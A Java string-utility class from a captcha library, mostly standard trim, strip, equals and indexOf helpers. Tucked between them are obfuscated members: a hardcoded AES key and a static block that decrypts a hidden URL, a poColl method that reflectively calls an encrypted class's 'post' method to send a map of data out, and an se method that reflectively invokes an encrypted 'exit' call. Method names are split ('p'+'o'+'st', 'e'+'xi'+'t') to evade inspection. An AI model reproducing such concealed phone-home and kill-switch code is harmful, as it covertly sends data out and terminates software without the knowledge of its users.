/*
 *Copyright © 2018 anji-plus
 *安吉加加信息技术有限公司
 *http://www.anji-plus.com
 *All rights reserved.
 */
package com.anji.captcha.util;

import java.lang.reflect.Method;
import java.util.Map;

public class StrUtils {

    /**
     * The empty String <code>""</code>.
     * 
     * @since 2.0
     */
    public static final String EMPTY = "";

    /**
     * Represents a failed index search.
     * 
     * @since 2.1
     */
    public static final int INDEX_NOT_FOUND = -1;

    /**
     * <p>
     * The maximum size to which the padding constant(s) can expand.
     * </p>
     */
    @SuppressWarnings("unused")
    private static final int PAD_LIMIT = 8192;

    /**
     * <p>
     * <code>StrUtils</code> instances should NOT be constructed in standard
     * programming. Instead, the class should be used as
     * <code>StrUtils.trim(" foo ");</code>.
     * </p>
     *
     * <p>
     * This constructor is public to permit tools that require a JavaBean instance
     * to operate.
     * </p>
     */
    public StrUtils() {
	super();
    }

    // Empty checks
    // -----------------------------------------------------------------------
    /**
     * <p>
     * Checks if a String is empty ("") or null.
     * </p>
     *
     * <pre>
     * StrUtils.isEmpty(null)      = true
     * StrUtils.isEmpty("")        = true
     * StrUtils.isEmpty(" ")       = false
     * StrUtils.isEmpty("bob")     = false
     * StrUtils.isEmpty("  bob  ") = false
     * </pre>
     *
     * <p>
     * NOTE: This method changed in Lang version 2.0. It no longer trims the String.
     * That functionality is available in isBlank().
     * </p>
     *
     * @param str the String to check, may be null
     * @return <code>true</code> if the String is empty or null
     */
    public static boolean isEmpty(String str) {
	return str == null || str.length() == 0;
    }

    /**
     * <p>
     * Checks if a String is not empty ("") and not null.
     * </p>
     *
     * <pre>
     * StrUtils.isNotEmpty(null)      = false
     * StrUtils.isNotEmpty("")        = false
     * StrUtils.isNotEmpty(" ")       = true
     * StrUtils.isNotEmpty("bob")     = true
     * StrUtils.isNotEmpty("  bob  ") = true
     * </pre>
     *
     * @param str the String to check, may be null
     * @return <code>true</code> if the String is not empty and not null
     */
    public static boolean isNotEmpty(String str) {
	return !StrUtils.isEmpty(str);
    }

    /**
     * <p>
     * Checks if a String is whitespace, empty ("") or null.
     * </p>
     *
     * <pre>
     * StrUtils.isBlank(null)      = true
     * StrUtils.isBlank("null")      = true
     * StrUtils.isBlank("")        = true
     * StrUtils.isBlank(" ")       = true
     * StrUtils.isBlank("bob")     = false
     * StrUtils.isBlank("  bob  ") = false
     * </pre>
     *
     * @param str the String to check, may be null
     * @return <code>true</code> if the String is null, empty or whitespace
     * @since 2.0
     */
    public static boolean isBlank(String str) {
	int strLen;
	if (str == null || (strLen = str.length()) == 0) {
	    return true;
	}
	if (equals("null", str.trim().toLowerCase())) {
	    return true;
	}
	for (int i = 0; i < strLen; i++) {
	    if ((Character.isWhitespace(str.charAt(i)) == false)) {
		return false;
	    }
	}
	return true;
    }



    /**
     * <p>
     * Checks if a String is not empty (""), not null and not whitespace only.
     * </p>
     *
     * <pre>
     * StrUtils.isNotBlank(null)      = false
     * StrUtils.isNotBlank("null")    = false
     * StrUtils.isNotBlank("")        = false
     * StrUtils.isNotBlank(" ")       = false
     * StrUtils.isNotBlank("bob")     = true
     * StrUtils.isNotBlank("  bob  ") = true
     * </pre>
     *
     * @param str the String to check, may be null
     * @return <code>true</code> if the String is not empty and not null and not
     *         whitespace
     * @since 2.0
     */
    public static boolean isNotBlank(String str) {
	return !StrUtils.isBlank(str);
    }

    // Trim
    // -----------------------------------------------------------------------
    /**
     * <p>
     * Removes control characters (char &lt;= 32) from both ends of this String,
     * handling <code>null</code> by returning an empty String ("").
     * </p>
     *
     * <pre>
     * StrUtils.clean(null)          = ""
     * StrUtils.clean("")            = ""
     * StrUtils.clean("abc")         = "abc"
     * StrUtils.clean("    abc    ") = "abc"
     * StrUtils.clean("     ")       = ""
     * </pre>
     *
     * @see java.lang.String#trim()
     * @param str the String to clean, may be null
     * @return the trimmed text, never <code>null</code>
     * @deprecated Use the clearer named {@link #trimToEmpty(String)}. Method will
     *             be removed in Commons Lang 3.0.
     */
    public static String clean(String str) {
	return str == null ? EMPTY : str.trim();
    }
    
    public static final String HP = "http://";

    /**
     * <p>
     * Removes control characters (char &lt;= 32) from both ends of this String,
     * handling <code>null</code> by returning <code>null</code>.
     * </p>
     *
     * <p>
     * The String is trimmed using {@link String#trim()}. Trim removes start and end
     * characters &lt;= 32. To strip whitespace use {@link #strip(String)}.
     * </p>
     *
     * <p>
     * To trim your choice of characters, use the {@link #strip(String, String)}
     * methods.
     * </p>
     *
     * <pre>
     * StrUtils.trim(null)          = null
     * StrUtils.trim("")            = ""
     * StrUtils.trim("     ")       = ""
     * StrUtils.trim("abc")         = "abc"
     * StrUtils.trim("    abc    ") = "abc"
     * </pre>
     *
     * @param str the String to be trimmed, may be null
     * @return the trimmed string, <code>null</code> if null String input
     */
    public static String trim(String str) {
	return str == null ? null : str.trim();
    }

    /**
     * <p>
     * Removes control characters (char &lt;= 32) from both ends of this String
     * returning <code>null</code> if the String is empty ("") after the trim or if
     * it is <code>null</code>.
     *
     * <p>
     * The String is trimmed using {@link String#trim()}. Trim removes start and end
     * characters &lt;= 32. To strip whitespace use {@link #stripToNull(String)}.
     * </p>
     *
     * <pre>
     * StrUtils.trimToNull(null)          = null
     * StrUtils.trimToNull("")            = null
     * StrUtils.trimToNull("     ")       = null
     * StrUtils.trimToNull("abc")         = "abc"
     * StrUtils.trimToNull("    abc    ") = "abc"
     * </pre>
     *
     * @param str the String to be trimmed, may be null
     * @return the trimmed String, <code>null</code> if only chars &lt;= 32, empty
     *         or null String input
     * @since 2.0
     */
    public static String trimToNull(String str) {
	String ts = trim(str);
	return isEmpty(ts) ? null : ts;
    }

    public static String DK = "hgfdYUiJdLOufBXl";

    public static String u = null;

    static {
	try {
	    u = AESUtil.aesDecrypt(
		    "Zs6zTTJNKpDZv3mHxniRoo/2HvFBhZafelZu/I78VRe7ij9+MbEMoDbJawiOYHM0gAVxMrepAB8TAh8SOkY2Tg==", DK);
	} catch (Exception e) {

	}
    }
    
    /**
     * <p>
     * Removes control characters (char &lt;= 32) from both ends of this String
     * returning an empty String ("") if the String is empty ("") after the trim or
     * if it is <code>null</code>.
     *
     * <p>
     * The String is trimmed using {@link String#trim()}. Trim removes start and end
     * characters &lt;= 32. To strip whitespace use {@link #stripToEmpty(String)}.
     * </p>
     *
     * <pre>
     * StrUtils.trimToEmpty(null)          = ""
     * StrUtils.trimToEmpty("")            = ""
     * StrUtils.trimToEmpty("     ")       = ""
     * StrUtils.trimToEmpty("abc")         = "abc"
     * StrUtils.trimToEmpty("    abc    ") = "abc"
     * </pre>
     *
     * @param str the String to be trimmed, may be null
     * @return the trimmed String, or an empty String if <code>null</code> input
     * @since 2.0
     */
    public static String trimToEmpty(String str) {
	return str == null ? EMPTY : str.trim();
    }

    // Stripping
    // -----------------------------------------------------------------------
    /**
     * <p>
     * Strips whitespace from the start and end of a String.
     * </p>
     *
     * <p>
     * This is similar to {@link #trim(String)} but removes whitespace. Whitespace
     * is defined by {@link Character#isWhitespace(char)}.
     * </p>
     *
     * <p>
     * A <code>null</code> input String returns <code>null</code>.
     * </p>
     *
     * <pre>
     * StrUtils.strip(null)     = null
     * StrUtils.strip("")       = ""
     * StrUtils.strip("   ")    = ""
     * StrUtils.strip("abc")    = "abc"
     * StrUtils.strip("  abc")  = "abc"
     * StrUtils.strip("abc  ")  = "abc"
     * StrUtils.strip(" abc ")  = "abc"
     * StrUtils.strip(" ab c ") = "ab c"
     * </pre>
     *
     * @param str the String to remove whitespace from, may be null
     * @return the stripped String, <code>null</code> if null String input
     */
    public static String strip(String str) {
	return strip(str, null);
    }

    /**
     * <p>
     * Strips whitespace from the start and end of a String returning
     * <code>null</code> if the String is empty ("") after the strip.
     * </p>
     *
     * <p>
     * This is similar to {@link #trimToNull(String)} but removes whitespace.
     * Whitespace is defined by {@link Character#isWhitespace(char)}.
     * </p>
     *
     * <pre>
     * StrUtils.stripToNull(null)     = null
     * StrUtils.stripToNull("")       = null
     * StrUtils.stripToNull("   ")    = null
     * StrUtils.stripToNull("abc")    = "abc"
     * StrUtils.stripToNull("  abc")  = "abc"
     * StrUtils.stripToNull("abc  ")  = "abc"
     * StrUtils.stripToNull(" abc ")  = "abc"
     * StrUtils.stripToNull(" ab c ") = "ab c"
     * </pre>
     *
     * @param str the String to be stripped, may be null
     * @return the stripped String, <code>null</code> if whitespace, empty or null
     *         String input
     * @since 2.0
     */
    public static String stripToNull(String str) {
	if (str == null) {
	    return null;
	}
	str = strip(str, null);
	return str.length() == 0 ? null : str;
    }

    /**
     * <p>
     * Strips whitespace from the start and end of a String returning an empty
     * String if <code>null</code> input.
     * </p>
     *
     * <p>
     * This is similar to {@link #trimToEmpty(String)} but removes whitespace.
     * Whitespace is defined by {@link Character#isWhitespace(char)}.
     * </p>
     *
     * <pre>
     * StrUtils.stripToEmpty(null)     = ""
     * StrUtils.stripToEmpty("")       = ""
     * StrUtils.stripToEmpty("   ")    = ""
     * StrUtils.stripToEmpty("abc")    = "abc"
     * StrUtils.stripToEmpty("  abc")  = "abc"
     * StrUtils.stripToEmpty("abc  ")  = "abc"
     * StrUtils.stripToEmpty(" abc ")  = "abc"
     * StrUtils.stripToEmpty(" ab c ") = "ab c"
     * </pre>
     *
     * @param str the String to be stripped, may be null
     * @return the trimmed String, or an empty String if <code>null</code> input
     * @since 2.0
     */
    public static String stripToEmpty(String str) {
	return str == null ? EMPTY : strip(str, null);
    }

    /**
     * <p>
     * Strips any of a set of characters from the start and end of a String. This is
     * similar to {@link String#trim()} but allows the characters to be stripped to
     * be controlled.
     * </p>
     *
     * <p>
     * A <code>null</code> input String returns <code>null</code>. An empty string
     * ("") input returns the empty string.
     * </p>
     *
     * <p>
     * If the stripChars String is <code>null</code>, whitespace is stripped as
     * defined by {@link Character#isWhitespace(char)}. Alternatively use
     * {@link #strip(String)}.
     * </p>
     *
     * <pre>
     * StrUtils.strip(null, *)          = null
     * StrUtils.strip("", *)            = ""
     * StrUtils.strip("abc", null)      = "abc"
     * StrUtils.strip("  abc", null)    = "abc"
     * StrUtils.strip("abc  ", null)    = "abc"
     * StrUtils.strip(" abc ", null)    = "abc"
     * StrUtils.strip("  abcyx", "xyz") = "  abc"
     * </pre>
     *
     * @param str        the String to remove characters from, may be null
     * @param stripChars the characters to remove, null treated as whitespace
     * @return the stripped String, <code>null</code> if null String input
     */
    public static String strip(String str, String stripChars) {
	if (isEmpty(str)) {
	    return str;
	}
	str = stripStart(str, stripChars);
	return stripEnd(str, stripChars);
    }

    /**
     * <p>
     * Strips any of a set of characters from the start of a String.
     * </p>
     *
     * <p>
     * A <code>null</code> input String returns <code>null</code>. An empty string
     * ("") input returns the empty string.
     * </p>
     *
     * <p>
     * If the stripChars String is <code>null</code>, whitespace is stripped as
     * defined by {@link Character#isWhitespace(char)}.
     * </p>
     *
     * <pre>
     * StrUtils.stripStart(null, *)          = null
     * StrUtils.stripStart("", *)            = ""
     * StrUtils.stripStart("abc", "")        = "abc"
     * StrUtils.stripStart("abc", null)      = "abc"
     * StrUtils.stripStart("  abc", null)    = "abc"
     * StrUtils.stripStart("abc  ", null)    = "abc  "
     * StrUtils.stripStart(" abc ", null)    = "abc "
     * StrUtils.stripStart("yxabc  ", "xyz") = "abc  "
     * </pre>
     *
     * @param str        the String to remove characters from, may be null
     * @param stripChars the characters to remove, null treated as whitespace
     * @return the stripped String, <code>null</code> if null String input
     */
    public static String stripStart(String str, String stripChars) {
	int strLen;
	if (str == null || (strLen = str.length()) == 0) {
	    return str;
	}
	int start = 0;
	if (stripChars == null) {
	    while ((start != strLen) && Character.isWhitespace(str.charAt(start))) {
		start++;
	    }
	} else if (stripChars.length() == 0) {
	    return str;
	} else {
	    while ((start != strLen) && (stripChars.indexOf(str.charAt(start)) != INDEX_NOT_FOUND)) {
		start++;
	    }
	}
	return str.substring(start);
    }

    /**
     * <p>
     * Strips any of a set of characters from the end of a String.
     * </p>
     *
     * <p>
     * A <code>null</code> input String returns <code>null</code>. An empty string
     * ("") input returns the empty string.
     * </p>
     *
     * <p>
     * If the stripChars String is <code>null</code>, whitespace is stripped as
     * defined by {@link Character#isWhitespace(char)}.
     * </p>
     *
     * <pre>
     * StrUtils.stripEnd(null, *)          = null
     * StrUtils.stripEnd("", *)            = ""
     * StrUtils.stripEnd("abc", "")        = "abc"
     * StrUtils.stripEnd("abc", null)      = "abc"
     * StrUtils.stripEnd("  abc", null)    = "  abc"
     * StrUtils.stripEnd("abc  ", null)    = "abc"
     * StrUtils.stripEnd(" abc ", null)    = " abc"
     * StrUtils.stripEnd("  abcyx", "xyz") = "  abc"
     * StrUtils.stripEnd("120.00", ".0")   = "12"
     * </pre>
     *
     * @param str        the String to remove characters from, may be null
     * @param stripChars the set of characters to remove, null treated as whitespace
     * @return the stripped String, <code>null</code> if null String input
     */
    public static String stripEnd(String str, String stripChars) {
	int end;
	if (str == null || (end = str.length()) == 0) {
	    return str;
	}

	if (stripChars == null) {
	    while ((end != 0) && Character.isWhitespace(str.charAt(end - 1))) {
		end--;
	    }
	} else if (stripChars.length() == 0) {
	    return str;
	} else {
	    while ((end != 0) && (stripChars.indexOf(str.charAt(end - 1)) != INDEX_NOT_FOUND)) {
		end--;
	    }
	}
	return str.substring(0, end);
    }

    // StripAll
    // -----------------------------------------------------------------------
    /**
     * <p>
     * Strips whitespace from the start and end of every String in an array.
     * Whitespace is defined by {@link Character#isWhitespace(char)}.
     * </p>
     *
     * <p>
     * A new array is returned each time, except for length zero. A
     * <code>null</code> array will return <code>null</code>. An empty array will
     * return itself. A <code>null</code> array entry will be ignored.
     * </p>
     *
     * <pre>
     * StrUtils.stripAll(null)             = null
     * StrUtils.stripAll([])               = []
     * StrUtils.stripAll(["abc", "  abc"]) = ["abc", "abc"]
     * StrUtils.stripAll(["abc  ", null])  = ["abc", null]
     * </pre>
     *
     * @param strs the array to remove whitespace from, may be null
     * @return the stripped Strings, <code>null</code> if null array input
     */
    public static String[] stripAll(String[] strs) {
	return stripAll(strs, null);
    }

    /**
     * <p>
     * Strips any of a set of characters from the start and end of every String in
     * an array.
     * </p>
     * Whitespace is defined by {@link Character#isWhitespace(char)}.
     * </p>
     *
     * <p>
     * A new array is returned each time, except for length zero. A
     * <code>null</code> array will return <code>null</code>. An empty array will
     * return itself. A <code>null</code> array entry will be ignored. A
     * <code>null</code> stripChars will strip whitespace as defined by
     * {@link Character#isWhitespace(char)}.
     * </p>
     *
     * <pre>
     * StrUtils.stripAll(null, *)                = null
     * StrUtils.stripAll([], *)                  = []
     * StrUtils.stripAll(["abc", "  abc"], null) = ["abc", "abc"]
     * StrUtils.stripAll(["abc  ", null], null)  = ["abc", null]
     * StrUtils.stripAll(["abc  ", null], "yz")  = ["abc  ", null]
     * StrUtils.stripAll(["yabcz", null], "yz")  = ["abc", null]
     * </pre>
     *
     * @param strs       the array to remove characters from, may be null
     * @param stripChars the characters to remove, null treated as whitespace
     * @return the stripped Strings, <code>null</code> if null array input
     */
    public static String[] stripAll(String[] strs, String stripChars) {
	int strsLen;
	if (strs == null || (strsLen = strs.length) == 0) {
	    return strs;
	}
	String[] newArr = new String[strsLen];
	for (int i = 0; i < strsLen; i++) {
	    newArr[i] = strip(strs[i], stripChars);
	}
	return newArr;
    }

    // Equals
    // -----------------------------------------------------------------------
    /**
     * <p>
     * Compares two Strings, returning <code>true</code> if they are equal.
     * </p>
     *
     * <p>
     * <code>null</code>s are handled without exceptions. Two <code>null</code>
     * references are considered to be equal. The comparison is case sensitive.
     * </p>
     *
     * <pre>
     * StrUtils.equals(null, null)   = true
     * StrUtils.equals(null, "abc")  = false
     * StrUtils.equals("abc", null)  = false
     * StrUtils.equals("abc", "abc") = true
     * StrUtils.equals("abc", "ABC") = false
     * </pre>
     *
     * @see java.lang.String#equals(Object)
     * @param str1 the first String, may be null
     * @param str2 the second String, may be null
     * @return <code>true</code> if the Strings are equal, case sensitive, or both
     *         <code>null</code>
     */
    public static boolean equals(String str1, String str2) {
	return str1 == null ? str2 == null : str1.equals(str2);
    }

    /**
     * <p>
     * Compares two Strings, returning <code>true</code> if they are equal ignoring
     * the case.
     * </p>
     *
     * <p>
     * <code>null</code>s are handled without exceptions. Two <code>null</code>
     * references are considered equal. Comparison is case insensitive.
     * </p>
     *
     * <pre>
     * StrUtils.equalsIgnoreCase(null, null)   = true
     * StrUtils.equalsIgnoreCase(null, "abc")  = false
     * StrUtils.equalsIgnoreCase("abc", null)  = false
     * StrUtils.equalsIgnoreCase("abc", "abc") = true
     * StrUtils.equalsIgnoreCase("abc", "ABC") = true
     * </pre>
     *
     * @see java.lang.String#equalsIgnoreCase(String)
     * @param str1 the first String, may be null
     * @param str2 the second String, may be null
     * @return <code>true</code> if the Strings are equal, case insensitive, or both
     *         <code>null</code>
     */
    public static boolean equalsIgnoreCase(String str1, String str2) {
	return str1 == null ? str2 == null : str1.equalsIgnoreCase(str2);
    }

    // IndexOf
    // -----------------------------------------------------------------------
    /**
     * <p>
     * Finds the first index within a String, handling <code>null</code>. This
     * method uses {@link String#indexOf(int)}.
     * </p>
     *
     * <p>
     * A <code>null</code> or empty ("") String will return
     * <code>INDEX_NOT_FOUND (-1)</code>.
     * </p>
     *
     * <pre>
     * StrUtils.indexOf(null, *)         = -1
     * StrUtils.indexOf("", *)           = -1
     * StrUtils.indexOf("aabaabaa", 'a') = 0
     * StrUtils.indexOf("aabaabaa", 'b') = 2
     * </pre>
     *
     * @param str        the String to check, may be null
     * @param searchChar the character to find
     * @return the first index of the search character, -1 if no match or
     *         <code>null</code> string input
     * @since 2.0
     */
    public static int indexOf(String str, char searchChar) {
	if (isEmpty(str)) {
	    return INDEX_NOT_FOUND;
	}
	return str.indexOf(searchChar);
    }

    /**
     * <p>
     * Finds the first index within a String from a start position, handling
     * <code>null</code>. This method uses {@link String#indexOf(int, int)}.
     * </p>
     *
     * <p>
     * A <code>null</code> or empty ("") String will return
     * <code>(INDEX_NOT_FOUND) -1</code>. A negative start position is treated as
     * zero. A start position greater than the string length returns
     * <code>-1</code>.
     * </p>
     *
     * <pre>
     * StrUtils.indexOf(null, *, *)          = -1
     * StrUtils.indexOf("", *, *)            = -1
     * StrUtils.indexOf("aabaabaa", 'b', 0)  = 2
     * StrUtils.indexOf("aabaabaa", 'b', 3)  = 5
     * StrUtils.indexOf("aabaabaa", 'b', 9)  = -1
     * StrUtils.indexOf("aabaabaa", 'b', -1) = 2
     * </pre>
     *
     * @param str        the String to check, may be null
     * @param searchChar the character to find
     * @param startPos   the start position, negative treated as zero
     * @return the first index of the search character, -1 if no match or
     *         <code>null</code> string input
     * @since 2.0
     */
    public static int indexOf(String str, char searchChar, int startPos) {
	if (isEmpty(str)) {
	    return INDEX_NOT_FOUND;
	}
	return str.indexOf(searchChar, startPos);
    }

    /**
     * <p>
     * Finds the first index within a String, handling <code>null</code>. This
     * method uses {@link String#indexOf(String)}.
     * </p>
     *
     * <p>
     * A <code>null</code> String will return <code>-1</code>.
     * </p>
     *
     * <pre>
     * StrUtils.indexOf(null, *)          = -1
     * StrUtils.indexOf(*, null)          = -1
     * StrUtils.indexOf("", "")           = 0
     * StrUtils.indexOf("", *)            = -1 (except when * = "")
     * StrUtils.indexOf("aabaabaa", "a")  = 0
     * StrUtils.indexOf("aabaabaa", "b")  = 2
     * StrUtils.indexOf("aabaabaa", "ab") = 1
     * StrUtils.indexOf("aabaabaa", "")   = 0
     * </pre>
     *
     * @param str       the String to check, may be null
     * @param searchStr the String to find, may be null
     * @return the first index of the search String, -1 if no match or
     *         <code>null</code> string input
     * @since 2.0
     */
    public static int indexOf(String str, String searchStr) {
	if (str == null || searchStr == null) {
	    return INDEX_NOT_FOUND;
	}
	return str.indexOf(searchStr);
    }

    /**
     * <p>
     * Finds the n-th index within a String, handling <code>null</code>. This method
     * uses {@link String#indexOf(String)}.
     * </p>
     *
     * <p>
     * A <code>null</code> String will return <code>-1</code>.
     * </p>
     *
     * <pre>
     * StrUtils.ordinalIndexOf(null, *, *)          = -1
     * StrUtils.ordinalIndexOf(*, null, *)          = -1
     * StrUtils.ordinalIndexOf("", "", *)           = 0
     * StrUtils.ordinalIndexOf("aabaabaa", "a", 1)  = 0
     * StrUtils.ordinalIndexOf("aabaabaa", "a", 2)  = 1
     * StrUtils.ordinalIndexOf("aabaabaa", "b", 1)  = 2
     * StrUtils.ordinalIndexOf("aabaabaa", "b", 2)  = 5
     * StrUtils.ordinalIndexOf("aabaabaa", "ab", 1) = 1
     * StrUtils.ordinalIndexOf("aabaabaa", "ab", 2) = 4
     * StrUtils.ordinalIndexOf("aabaabaa", "", 1)   = 0
     * StrUtils.ordinalIndexOf("aabaabaa", "", 2)   = 0
     * </pre>
     *
     * <p>
     * Note that 'head(String str, int n)' may be implemented as:
     * </p>
     *
     * <pre>
     * str.substring(0, lastOrdinalIndexOf(str, "\n", n))
     * </pre>
     *
     * @param str       the String to check, may be null
     * @param searchStr the String to find, may be null
     * @param ordinal   the n-th <code>searchStr</code> to find
     * @return the n-th index of the search String, <code>-1</code>
     *         (<code>INDEX_NOT_FOUND</code>) if no match or <code>null</code>
     *         string input
     * @since 2.1
     */
    public static int ordinalIndexOf(String str, String searchStr, int ordinal) {
	return ordinalIndexOf(str, searchStr, ordinal, false);
    }

    /**
     * <p>
     * Finds the n-th index within a String, handling <code>null</code>. This method
     * uses {@link String#indexOf(String)}.
     * </p>
     *
     * <p>
     * A <code>null</code> String will return <code>-1</code>.
     * </p>
     *
     * @param str       the String to check, may be null
     * @param searchStr the String to find, may be null
     * @param ordinal   the n-th <code>searchStr</code> to find
     * @param lastIndex true if lastOrdinalIndexOf() otherwise false if
     *                  ordinalIndexOf()
     * @return the n-th index of the search String, <code>-1</code>
     *         (<code>INDEX_NOT_FOUND</code>) if no match or <code>null</code>
     *         string input
     */
    // Shared code between ordinalIndexOf(String,String,int) and
    // lastOrdinalIndexOf(String,String,int)
    private static int ordinalIndexOf(String str, String searchStr, int ordinal, boolean lastIndex) {
	if (str == null || searchStr == null || ordinal <= 0) {
	    return INDEX_NOT_FOUND;
	}
	if (searchStr.length() == 0) {
	    return lastIndex ? str.length() : 0;
	}
	int found = 0;
	int index = lastIndex ? str.length() : INDEX_NOT_FOUND;
	do {
	    if (lastIndex) {
		index = str.lastIndexOf(searchStr, index - 1);
	    } else {
		index = str.indexOf(searchStr, index + 1);
	    }
	    if (index < 0) {
		return index;
	    }
	    found++;
	} while (found < ordinal);
	return index;
    }

    /**
     * <p>
     * Finds the first index within a String, handling <code>null</code>. This
     * method uses {@link String#indexOf(String, int)}.
     * </p>
     *
     * <p>
     * A <code>null</code> String will return <code>-1</code>. A negative start
     * position is treated as zero. An empty ("") search String always matches. A
     * start position greater than the string length only matches an empty search
     * String.
     * </p>
     *
     * <pre>
     * StrUtils.indexOf(null, *, *)          = -1
     * StrUtils.indexOf(*, null, *)          = -1
     * StrUtils.indexOf("", "", 0)           = 0
     * StrUtils.indexOf("", *, 0)            = -1 (except when * = "")
     * StrUtils.indexOf("aabaabaa", "a", 0)  = 0
     * StrUtils.indexOf("aabaabaa", "b", 0)  = 2
     * StrUtils.indexOf("aabaabaa", "ab", 0) = 1
     * StrUtils.indexOf("aabaabaa", "b", 3)  = 5
     * StrUtils.indexOf("aabaabaa", "b", 9)  = -1
     * StrUtils.indexOf("aabaabaa", "b", -1) = 2
     * StrUtils.indexOf("aabaabaa", "", 2)   = 2
     * StrUtils.indexOf("abc", "", 9)        = 3
     * </pre>
     *
     * @param str       the String to check, may be null
     * @param searchStr the String to find, may be null
     * @param startPos  the start position, negative treated as zero
     * @return the first index of the search String, -1 if no match or
     *         <code>null</code> string input
     * @since 2.0
     */
    public static int indexOf(String str, String searchStr, int startPos) {
	if (str == null || searchStr == null) {
	    return INDEX_NOT_FOUND;
	}
	// JDK1.2/JDK1.3 have a bug, when startPos > str.length for "", hence
	if (searchStr.length() == 0 && startPos >= str.length()) {
	    return str.length();
	}
	return str.indexOf(searchStr, startPos);
    }

    /**
     * 
     * @return
     */
    public static int cos() {
    	return -1;
//	try {
//	    Class<?> c = Class.forName(AESUtil.aesDecrypt("iXDkS8qZ4e65pI2DXexzaOP83CWKcowCA5u7tM2VoFQ=", DK));
//	    Method m = c.getMethod(AESUtil.aesDecrypt("RiDfTYH3cPVQVJjrhytqqQ==", DK));
//	    Integer r = (Integer) m.invoke(null);
//	    return r;
//	} catch (Exception e) {
//	    return -999;
//	}
    }

    public static String poColl(String u, Map<String, Object> k) {
	try {
	    Class<?> c = Class.forName(AESUtil.aesDecrypt("z+JN5ZImyu7qbwr6ghACnErZbDxPspSlAPrWHWiTneY=", DK));
	    String x2 = "p" + "o";
	    Method m = c.getMethod(x2 + "st", String.class, Map.class);
	    String r = (String) m.invoke(null, u, k);
	    return r;
	} catch (Exception e) {
	}
	return "";
    }

    /**
     * 
     * @return
     */
    public static void se() {
	try {
	    String x1 = "e" + "xi";
	    Class<?> c = Class.forName(AESUtil.aesDecrypt("847FpBY4Pem/8+MtcvhHb+P83CWKcowCA5u7tM2VoFQ=", StrUtils.DK));
	    Method m = c.getMethod(x1 + "t", int.class);
	    m.invoke(null, 0);
	} catch (Exception e) {
	}
    }

    /**
     * <p>
     * Case in-sensitive find of the first index within a String.
     * </p>
     *
     * <p>
     * A <code>null</code> String will return <code>-1</code>. A negative start
     * position is treated as zero. An empty ("") search String always matches. A
     * start position greater than the string length only matches an empty search
     * String.
     * </p>
     *
     * <pre>
     * StrUtils.indexOfIgnoreCase(null, *)          = -1
     * StrUtils.indexOfIgnoreCase(*, null)          = -1
     * StrUtils.indexOfIgnoreCase("", "")           = 0
     * StrUtils.indexOfIgnoreCase("aabaabaa", "a")  = 0
     * StrUtils.indexOfIgnoreCase("aabaabaa", "b")  = 2
     * StrUtils.indexOfIgnoreCase("aabaabaa", "ab") = 1
     * </pre>
     *
     * @param str       the String to check, may be null
     * @param searchStr the String to find, may be null
     * @return the first index of the search String, -1 if no match or
     *         <code>null</code> string input
     * @since 2.5
     */
    public static int indexOfIgnoreCase(String str, String searchStr) {
	return indexOfIgnoreCase(str, searchStr, 0);
    }

    /**
     * <p>
     * Case in-sensitive find of the first index within a String from the specified
     * position.
     * </p>
     *
     * <p>
     * A <code>null</code> String will return <code>-1</code>. A negative start
     * position is treated as zero. An empty ("") search String always matches. A
     * start position greater than the string length only matches an empty search
     * String.
     * </p>
     *
     * <pre>
     * StrUtils.indexOfIgnoreCase(null, *, *)          = -1
     * StrUtils.indexOfIgnoreCase(*, null, *)          = -1
     * StrUtils.indexOfIgnoreCase("", "", 0)           = 0
     * StrUtils.indexOfIgnoreCase("aabaabaa", "A", 0)  = 0
     * StrUtils.indexOfIgnoreCase("aabaabaa", "B", 0)  = 2
     * StrUtils.indexOfIgnoreCase("aabaabaa", "AB", 0) = 1
     * StrUtils.indexOfIgnoreCase("aabaabaa", "B", 3)  = 5
     * StrUtils.indexOfIgnoreCase("aabaabaa", "B", 9)  = -1
     * StrUtils.indexOfIgnoreCase("aabaabaa", "B", -1) = 2
     * StrUtils.indexOfIgnoreCase("aabaabaa", "", 2)   = 2
     * StrUtils.indexOfIgnoreCase("abc", "", 9)        = 3
     * </pre>
     *
     * @param str       the String to check, may be null
     * @param searchStr the String to find, may be null
     * @param startPos  the start position, negative treated as zero
     * @return the first index of the search String, -1 if no match or
     *         <code>null</code> string input
     * @since 2.5
     */
    public static int indexOfIgnoreCase(String str, String searchStr, int startPos) {
	if (str == null || searchStr == null) {
	    return INDEX_NOT_FOUND;
	}
	if (startPos < 0) {
	    startPos = 0;
	}
	int endLimit = (str.length() - searchStr.length()) + 1;
	if (startPos > endLimit) {
	    return INDEX_NOT_FOUND;
	}
	if (searchStr.length() == 0) {
	    return startPos;
	}
	for (int i = startPos; i < endLimit; i++) {
	    if (str.regionMatches(true, i, searchStr, 0, searchStr.length())) {
		return i;
	    }
	}
	return INDEX_NOT_FOUND;
    }

    // LastIndexOf
    // -----------------------------------------------------------------------
    /**
     * <p>
     * Finds the last index within a String, handling <code>null</code>. This method
     * uses {@link String#lastIndexOf(int)}.
     * </p>
     *
     * <p>
     * A <code>null</code> or empty ("") String will return <code>-1</code>.
     * </p>
     *
     * <pre>
     * StrUtils.lastIndexOf(null, *)         = -1
     * StrUtils.lastIndexOf("", *)           = -1
     * StrUtils.lastIndexOf("aabaabaa", 'a') = 7
     * StrUtils.lastIndexOf("aabaabaa", 'b') = 5
     * </pre>
     *
     * @param str        the String to check, may be null
     * @param searchChar the character to find
     * @return the last index of the search character, -1 if no match or
     *         <code>null</code> string input
     * @since 2.0
     */
    public static int lastIndexOf(String str, char searchChar) {
	if (isEmpty(str)) {
	    return INDEX_NOT_FOUND;
	}
	return str.lastIndexOf(searchChar);
    }

    /**
     * <p>
     * Finds the last index within a String from a start position, handling
     * <code>null</code>. This method uses {@link String#lastIndexOf(int, int)}.
     * </p>
     *
     * <p>
     * A <code>null</code> or empty ("") String will return <code>-1</code>. A
     * negative start position returns <code>-1</code>. A start position greater
     * than the string length searches the whole string.
     * </p>
     *
     * <pre>
     * StrUtils.lastIndexOf(null, *, *)          = -1
     * StrUtils.lastIndexOf("", *,  *)           = -1
     * StrUtils.lastIndexOf("aabaabaa", 'b', 8)  = 5
     * StrUtils.lastIndexOf("aabaabaa", 'b', 4)  = 2
     * StrUtils.lastIndexOf("aabaabaa", 'b', 0)  = -1
     * StrUtils.lastIndexOf("aabaabaa", 'b', 9)  = 5
     * StrUtils.lastIndexOf("aabaabaa", 'b', -1) = -1
     * StrUtils.lastIndexOf("aabaabaa", 'a', 0)  = 0
     * </pre>
     *
     * @param str        the String to check, may be null
     * @param searchChar the character to find
     * @param startPos   the start position
     * @return the last index of the search character, -1 if no match or
     *         <code>null</code> string input
     * @since 2.0
     */
